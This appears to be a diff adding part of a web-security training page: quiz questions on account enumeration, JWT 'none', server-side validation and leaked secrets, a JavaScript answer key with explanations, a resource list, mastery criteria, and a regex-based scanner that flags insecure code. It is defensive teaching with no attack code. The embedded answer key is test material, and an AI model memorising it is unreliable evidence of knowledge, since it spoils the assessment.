+                <p class="quiz-question">12. Which login error message follows security best practices?</p>
+                <label class="quiz-option"><input type="radio" name="q12" value="A"> A) "No account found with this email address"</label>
+                <label class="quiz-option"><input type="radio" name="q12" value="B"> B) "Incorrect password — please try again"</label>
+                <label class="quiz-option"><input type="radio" name="q12" value="C"> C) "Invalid email or password"</label>
+                <label class="quiz-option"><input type="radio" name="q12" value="D"> D) "Account exists but password is wrong"</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">13. What does server-side input validation prevent that client-side validation cannot?</p>
+                <label class="quiz-option"><input type="radio" name="q13" value="A"> A) Nothing — they are equivalent</label>
+                <label class="quiz-option"><input type="radio" name="q13" value="B"> B) Client-side validation can be bypassed by disabling JavaScript or using tools like curl — server-side validation cannot be bypassed</label>
+                <label class="quiz-option"><input type="radio" name="q13" value="C"> C) Server-side validation is slower, so client-side should always be used</label>
+                <label class="quiz-option"><input type="radio" name="q13" value="D"> D) Server-side validation only works for database operations</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">14. What is the main security risk of the <code>algorithm: 'none'</code> option in JWT?</p>
+                <label class="quiz-option"><input type="radio" name="q14" value="A"> A) The token cannot be decoded by the server</label>
+                <label class="quiz-option"><input type="radio" name="q14" value="B"> B) The token expires immediately</label>
+                <label class="quiz-option"><input type="radio" name="q14" value="C"> C) It accepts tokens with no signature — anyone can forge a valid JWT by setting algorithm to none and providing any payload</label>
+                <label class="quiz-option"><input type="radio" name="q14" value="D"> D) It disables HTTPS for the API endpoint</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">15. What should you do immediately if an API key or secret is accidentally pushed to a public GitHub repository?</p>
+                <label class="quiz-option"><input type="radio" name="q15" value="A"> A) Delete the commit from GitHub — this is sufficient to prevent exploitation</label>
+                <label class="quiz-option"><input type="radio" name="q15" value="B"> B) Make the repository private immediately</label>
+                <label class="quiz-option"><input type="radio" name="q15" value="C"> C) Immediately revoke and rotate the compromised credential in the provider's dashboard, then check audit logs for unauthorised use</label>
+                <label class="quiz-option"><input type="radio" name="q15" value="D"> D) Wait to see if anyone exploits it before taking action</label>
+            </div>
+
+        </form>
+
+        <div class="quiz-controls">
+            <button id="submit-quiz" class="btn btn-primary">Submit Assessment</button>
+            <button id="clear-quiz" class="btn btn-back">Clear Answers</button>
+        </div>
+
+        <div id="quiz-results" class="quiz-results" style="display: none;">
+            <div class="results-title">Quiz Results</div>
+            <div id="quiz-score" class="quiz-score"></div>
+            <div id="quiz-feedback"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+class QuizManager {
+    constructor() {
+        this.questionsData = {
+            q1:  { correct: 'B', exp: 'XSS (Cross-Site Scripting) injects malicious scripts into web pages that are then executed by other users\' browsers. The injected script runs in the victim\'s session and can steal cookies, hijack accounts, or exfiltrate data.' },
+            q2:  { correct: 'C', exp: 'textContent treats the value as plain text and never interprets it as HTML — making it immune to XSS. innerHTML, document.write, and eval all interpret input as executable code, creating XSS vulnerabilities.' },
+            q3:  { correct: 'C', exp: 'CSP (Content Security Policy) is a response header that instructs the browser to only execute scripts from approved sources. Even if an XSS injection succeeds, CSP can block the malicious script from running by rejecting unauthorised sources.' },
+            q4:  { correct: 'B', exp: 'CSRF works by tricking an authenticated user\'s browser into making an unintended request. Since browsers automatically attach cookies to requests, the server cannot distinguish the forged request from a legitimate one without explicit CSRF protections.' },
+            q5:  { correct: 'B', exp: 'Parameterised queries separate SQL code from data — the database engine treats the user input as a literal value, never as SQL syntax. No amount of clever input can escape the parameter and modify the query structure.' },
+            q6:  { correct: 'D', exp: 'MD5 and SHA-1 are designed to be fast — computing billions of hashes per second on modern hardware. This makes brute-force and rainbow table attacks feasible. Password hashing algorithms like bcrypt and argon2 are intentionally slow (hundreds of milliseconds), making attacks computationally impractical.' },
+            q7:  { correct: 'B', exp: 'HttpOnly prevents the cookie from being accessed by document.cookie in JavaScript. Even if an XSS attack successfully injects a script, it cannot steal HttpOnly cookies — making it a critical defence for session tokens.' },
+            q8:  { correct: 'B', exp: 'Access-Control-Allow-Origin: * allows any origin to make cross-origin requests to your API. While it\'s safe for truly public data, it\'s dangerous for any endpoint that uses cookies or handles sensitive data, as malicious sites can then make authenticated requests on behalf of your users.' },
+            q9:  { correct: 'B', exp: 'localStorage is accessible by any JavaScript running on the page. An XSS attack can execute document.cookie or read localStorage — stealing the JWT and using it to impersonate the user from anywhere. HttpOnly cookies are immune to this attack.' },
+            q10: { correct: 'B', exp: 'HSTS tells the browser to never connect to this domain over plain HTTP for the specified max-age period. This prevents protocol downgrade attacks where an attacker redirects HTTP traffic before it can be upgraded to HTTPS.' },
+            q11: { correct: 'C', exp: 'A CSRF token is a unique, secret, session-specific value embedded in forms. The server validates it on every state-changing request. Since malicious cross-site requests cannot read the token (due to Same-Origin Policy), forged requests will fail validation.' },
+            q12: { correct: 'C', exp: '"Invalid email or password" prevents account enumeration — attackers cannot determine whether a given email address is registered in your system. Specific messages like "no account found" or "wrong password" allow attackers to enumerate valid emails for targeted attacks.' },
+            q13: { correct: 'B', exp: 'Client-side validation is purely a UX feature — it can be trivially bypassed by disabling JavaScript, using browser dev tools, or sending raw HTTP requests with curl or Postman. Server-side validation is the only reliable security boundary because the server controls it.' },
+            q14: { correct: 'C', exp: 'The "none" algorithm means the JWT has no cryptographic signature. Vulnerable libraries that accept this will validate any token regardless of its contents. An attacker can craft a token with any userId or role and the server will accept it as legitimate — a complete authentication bypass.' },
+            q15: { correct: 'C', exp: 'Deleting a commit or making a repo private does NOT protect you — bots and attackers scrape GitHub in real time and the secret may already be harvested. The only safe action is to immediately revoke and rotate the credential in the provider\'s dashboard, making the leaked key useless even if possessed by an attacker.' }
+        };
+        this.init();
+    }
+
+    init() {
+        document.getElementById('submit-quiz').addEventListener('click', () => this.submitQuiz());
+        document.getElementById('clear-quiz').addEventListener('click', () => this.clearQuiz());
+    }
+
+    submitQuiz() {
+        const formData = new FormData(document.getElementById('quiz-form'));
+        let score = 0;
+        let feedbackHTML = '';
+
+        Object.keys(this.questionsData).forEach((key, index) => {
+            const userAnswer = formData.get(key);
+            const isCorrect = userAnswer === this.questionsData[key].correct;
+            if (isCorrect) score++;
+            feedbackHTML += `
+    <div class="feedback-item ${isCorrect ? 'feedback-correct' : 'feedback-incorrect'}">
+        <span class="feedback-icon">${isCorrect ? '✓' : '✗'}</span>
+        <div>
+            <strong>Question ${index + 1}:</strong> ${this.questionsData[key].exp}
+            ${!isCorrect ? `<br><small class="correct-answer">Correct answer: Option ${this.questionsData[key].correct}</small>` : ''}
+        </div>
+    </div>`;
+        });
+
+        const total = Object.keys(this.questionsData).length;
+        const percent = Math.round((score / total) * 100);
+        let scoreClass = percent >= 80 ? 'score-excellent' : (percent >= 50 ? 'score-good' : 'score-poor');
+        document.getElementById('quiz-score').innerHTML = `
+            <div class="${scoreClass}">${score}/${total} (${percent}%)</div>
+            <p style="color: var(--text-secondary)">${percent >= 70 ? 'Excellent! You have a solid security foundation.' : 'Review the attack sections carefully — security knowledge is critical to protect your users.'}</p>`;
+        document.getElementById('quiz-feedback').innerHTML = feedbackHTML;
+        const resultsDiv = document.getElementById('quiz-results');
+        resultsDiv.style.display = 'block';
+        resultsDiv.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    clearQuiz() {
+        document.getElementById('quiz-form').reset();
+        document.getElementById('quiz-results').style.display = 'none';
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+}
+document.addEventListener('DOMContentLoaded', () => { new QuizManager(); });
+</script>
+
+        <!-- ═══════════════════════════ RESOURCES ═══════════════════════════ -->
+        <div id="resources" class="tab-panel">
+            <div class="content-card">
+                <h3>Recommended Resources</h3>
+                <p style="color:var(--text-secondary);margin-bottom:1.5rem;">The most trusted and practical resources for mastering web application security.</p>
+
+                <div>
+                    <h4 style="color:var(--cyan);margin-bottom:0.8rem;">Hands-On Practice</h4>
+                    <a href="#" class="resource-link">PortSwigger Web Security Academy — Free interactive labs for every OWASP vulnerability</a>
+                    <a href="#" class="resource-link">OWASP WebGoat — Deliberately insecure app to practice exploiting and fixing</a>
+                    <a href="#" class="resource-link">HackTheBox / TryHackMe — Gamified security challenges and CTFs</a>
+                    <a href="#" class="resource-link">DVWA (Damn Vulnerable Web Application) — Self-hosted practice target</a>
+                </div>
+                <div style="margin-top:1.5rem;">
+                    <h4 style="color:var(--cyan);margin-bottom:0.8rem;">Official References</h4>
+                    <a href="#" class="resource-link">OWASP Top 10 — The definitive vulnerability classification</a>
+                    <a href="#" class="resource-link">OWASP Cheat Sheet Series — Practical implementation guides for every topic</a>
+                    <a href="#" class="resource-link">MDN — Same-Origin Policy and CORS documentation</a>
+                    <a href="#" class="resource-link">NIST Password Guidelines (SP 800-63B)</a>
+                </div>
+                <div style="margin-top:1.5rem;">
+                    <h4 style="color:var(--cyan);margin-bottom:0.8rem;">Tools</h4>
+                    <a href="#" class="resource-link">OWASP ZAP — Free automated vulnerability scanner</a>
+                    <a href="#" class="resource-link">Burp Suite Community — The industry-standard intercepting proxy</a>
+                    <a href="#" class="resource-link">securityheaders.com — Analyse your HTTP response headers</a>
+                    <a href="#" class="resource-link">Have I Been Pwned — Check if credentials were in a breach</a>
+                </div>
+                <div style="margin-top:1.5rem;">
+                    <h4 style="color:var(--cyan);margin-bottom:0.8rem;">Libraries & Packages</h4>
+                    <a href="#" class="resource-link">Helmet.js — Security headers for Express.js</a>
+                    <a href="#" class="resource-link">bcrypt / argon2 — Password hashing</a>
+                    <a href="#" class="resource-link">DOMPurify — Client-side HTML sanitisation</a>
+                    <a href="#" class="resource-link">express-rate-limit — Request throttling for Express</a>
+                </div>
+                <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1rem;border-radius:8px;margin-top:1.5rem;">
+                    <p>💡 <strong>Tip:</strong> The PortSwigger Web Security Academy is completely free and covers every vulnerability in this module with interactive labs. It is the single best resource available for practising web security — start there.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- ═══════════════════════════ EVALUATION ═══════════════════════════ -->
+        <div id="evaluation" class="tab-panel">
+    <div class="content-card">
+        <h3>🎯 Mastery Criteria: Security — Frontend & Backend</h3>
+        <p style="color: var(--text-secondary); margin-bottom: 2rem;">
+            Criteria organised by importance levels to assess your mastery of web application security.
+        </p>
+
+        <div class="evaluation-grid">
+            <div class="evaluation-column">
+                <h4 class="evaluation-title essential">
+                    <span>💠</span> Essential
+                </h4>
+                <ul class="evaluation-list">
+                    <li><strong>XSS Prevention:</strong> Never use <code>innerHTML</code> with user data; use <code>textContent</code> and sanitise HTML with DOMPurify when needed.</li>
+                    <li><strong>SQL Injection:</strong> Always use parameterised queries or a trusted ORM — never concatenate user input into SQL.</li>
+                    <li><strong>Password Hashing:</strong> Hash passwords with bcrypt or argon2 — never store plain text or use MD5/SHA-1.</li>
+                    <li><strong>HTTPS:</strong> All production apps use HTTPS; never transmit sensitive data over HTTP.</li>
+                    <li><strong>Secrets:</strong> Never commit <code>.env</code> files; use platform secret stores in production.</li>
+                </ul>
+            </div>
+
+            <div class="evaluation-column">
+                <h4 class="evaluation-title important">
+                    <span>⭐</span> Important
+                </h4>
+                <ul class="evaluation-list">
+                    <li><strong>CSRF:</strong> Implement CSRF tokens and use <code>SameSite</code> cookie attributes on state-changing endpoints.</li>
+                    <li><strong>Security Headers:</strong> Apply Helmet.js or equivalent for CSP, HSTS, X-Frame-Options, and other critical headers.</li>
+                    <li><strong>CORS:</strong> Whitelist specific origins — never use wildcard <code>*</code> for credentialed requests.</li>
+                    <li><strong>Rate Limiting:</strong> Apply rate limits to all public endpoints, especially authentication routes.</li>
+                    <li><strong>Input Validation:</strong> Validate and type-check all incoming data server-side (Zod, Joi).</li>
+                </ul>
+            </div>
+
+            <div class="evaluation-column">
+                <h4 class="evaluation-title advanced">
+                    <span>🚀</span> Advanced
+                </h4>
+                <ul class="evaluation-list">
+                    <li><strong>JWT Security:</strong> Use short-lived access tokens, HttpOnly refresh tokens, and explicit algorithm whitelisting.</li>
+                    <li><strong>MFA:</strong> Implement TOTP or WebAuthn as a second authentication factor.</li>
+                    <li><strong>Dependency Auditing:</strong> Automate vulnerability scanning with Dependabot and <code>npm audit</code> in CI.</li>
+                    <li><strong>Security Logging:</strong> Log all authentication events and access violations for forensic analysis.</li>
+                    <li><strong>Penetration Testing:</strong> Use OWASP ZAP or Burp Suite to actively probe your own applications for vulnerabilities.</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+</main>
+
+<script>
+    function openTab(evt, tabName) {
+        document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.tab-button').forEach(b => b.classList.remove('active'));
+        document.getElementById(tabName).classList.add('active');
+        evt.currentTarget.classList.add('active');
+        const progressMap = { learn: 25, lab: 50, quiz: 75, resources: 90, evaluation: 100 };
+        document.getElementById('progress-fill').style.width = progressMap[tabName] + '%';
+        document.getElementById('progress-text').innerText = progressMap[tabName] + '%';
+        window.scrollTo({ top: 150, behavior: 'smooth' });
+    }
+
+    function runSecScan() {
+        const input = document.getElementById('sec-input').value;
+        const out = document.getElementById('sec-output');
+        let criticals = [], highs = [], suggestions = [];
+
+        // SQL Injection detection
+        if (/`[^`]*\$\{[^}]*\}[^`]*`/.test(input) && /SELECT|INSERT|UPDATE|DELETE|WHERE/i.test(input))
+            criticals.push({ title: 'SQL Injection', detail: 'Template literal used to construct a SQL query with user input. Use parameterised queries: <code>db.query("SELECT * FROM users WHERE id = $1", [userId])</code>' });
+
+        // innerHTML usage
+        if (/\.innerHTML\s*=/.test(input))
+            criticals.push({ title: 'Potential XSS via innerHTML', detail: 'Assigning to innerHTML can execute injected scripts. Use <code>textContent</code> for plain text, or <code>DOMPurify.sanitize()</code> if HTML is required.' });
+
+        // eval usage
+        if (/\beval\s*\(/.test(input))
+            criticals.push({ title: 'Dangerous eval() usage', detail: '<code>eval()</code> executes arbitrary code. Remove it entirely — there is almost always a safer alternative.' });
+
+        // Plain text password
+        if (/password.*=.*req\.body|body\.password/i.test(input) && !/bcrypt|argon|hash/i.test(input))
+            criticals.push({ title: 'Password stored without hashing', detail: 'Passwords must be hashed before storage using bcrypt or argon2. Never store or compare plain text passwords.' });
+
+        // Missing rate limiting
+        if (/login|register|auth/i.test(input) && !/rateLimit|rate_limit|throttle/i.test(input))
+            highs.push({ title: 'No rate limiting on auth endpoint', detail: 'Authentication endpoints are vulnerable to brute-force attacks without rate limiting. Add <code>express-rate-limit</code> with a maximum of 5–10 attempts per window.' });
+
+        // Missing CORS config
+        if (/express\(\)|app\s*=.*express/i.test(input) && !/cors/i.test(input))
+            highs.push({ title: 'No CORS configuration', detail: 'Without explicit CORS configuration, your API may allow requests from unintended origins. Configure <code>cors()</code> middleware with a whitelist of allowed origins.' });
+
+        // No input validation
+        if (/req\.body/i.test(input) && !/zod|joi|validate|schema/i.test(input))
+            highs.push({ title: 'Missing input validation', detail: 'Request body is used without validation. Use Zod or Joi to validate and sanitise all incoming data before processing.' });
+
+        // Exposing stack traces
+        if (/res\.json\(.*err\b|res\.send\(.*error\b/i.test(input) && !/message/i.test(input))
+            highs.push({ title: 'Potential error/stack trace exposure', detail: 'Sending raw error objects to clients can expose internal details. Return generic error messages: <code>res.status(500).json({ error: "Internal server error" })</code>' });
+
+        // Generic error message reveals username existence
+        if (/user\s*not\s*found|no\s*account/i.test(input))
+            suggestions.push('💡 <strong>Account enumeration:</strong> Error messages that reveal whether a username/email exists allow attackers to enumerate valid accounts. Use generic messages like "Invalid email or password".');
+
+        // Helmet suggestion
+        if (/express\(\)|app\s*=.*express/i.test(input) && !/helmet/i.test(input))
+            suggestions.push('💡 <strong>Missing security headers:</strong> Add <code>helmet()</code> middleware to set critical HTTP security headers (CSP, HSTS, X-Frame-Options, etc.) with a single line.');
+
+        let html = '<strong style="color:#28e0ff;">Security Vulnerability Report</strong><br><br>';
+
+        if (criticals.length === 0 && highs.length === 0 && suggestions.length === 0) {
+            html += '<span style="color:#10b981;">✅ No obvious vulnerabilities detected in this snippet.<br>Always perform a full OWASP ZAP scan and manual code review for production code.</span>';
+        } else {
+            if (criticals.length > 0) {
+                html += `<strong style="color:#ff5555;">🔴 CRITICAL (${criticals.length}):</strong><br>`;
+                criticals.forEach(v => { html += `<div style="margin:0.5rem 0;padding:0.7rem;background:rgba(255,50,50,0.1);border-left:3px solid #ff5555;border-radius:0 4px 4px 0;"><strong style="color:#ff5555;">${v.title}</strong><br><span style="font-size:0.8rem;color:#ccc;">${v.detail}</span></div>`; });
+            }
+            if (highs.length > 0) {
+                html += `<br><strong style="color:#ff9900;">🟠 HIGH (${highs.length}):</strong><br>`;
+                highs.forEach(v => { html += `<div style="margin:0.5rem 0;padding:0.7rem;background:rgba(255,150,0,0.08);border-left:3px solid #ff9900;border-radius:0 4px 4px 0;"><strong style="color:#ff9900;">${v.title}</strong><br><span style="font-size:0.8rem;color:#ccc;">${v.detail}</span></div>`; });
+            }
+            if (suggestions.length > 0) {
+                html += `<br><strong style="color:#ffd700;">🟡 SUGGESTIONS (${suggestions.length}):</strong><br>`;
+                suggestions.forEach(s => { html += `<div style="margin:0.5rem 0;padding:0.7rem;background:rgba(255,220,0,0.06);border-left:3px solid #ffd700;border-radius:0 4px 4px 0;font-size:0.8rem;color:#ccc;">${s}</div>`; });
+            }
+        }
+
+        html += '<br><em style="color:#555;font-size:0.75rem;">This is a static pattern-based scanner. Use OWASP ZAP and Burp Suite for comprehensive security testing.</em>';
+        out.innerHTML = html;
+    }
+</script>
+
+</body>
+</html>
